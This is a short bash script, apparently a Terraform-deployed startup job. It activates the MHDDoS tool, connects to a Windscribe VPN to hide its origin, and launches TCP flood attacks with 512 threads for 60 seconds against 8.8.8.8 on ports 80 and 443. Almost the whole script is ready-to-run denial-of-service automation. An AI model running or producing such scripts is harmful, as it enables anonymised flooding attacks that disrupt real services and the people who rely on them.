#!/bin/bash
exec 1> /home/ubuntu/from_terraform_with_love.log 2>&1
set -x

cd /home/ubuntu/MHDDoS
source venv/bin/activate

echo 'Starting'
# sudo /etc/init.d/windscribe-cli start
windscribe connect "Rakia"

python3 start.py TCP 8.8.8.8:80 512 60 true
python3 start.py TCP 8.8.8.8:443 512 60 true

windscribe disconnect
deactivate
echo 'Finished, shutting down...'

# sudo shutdown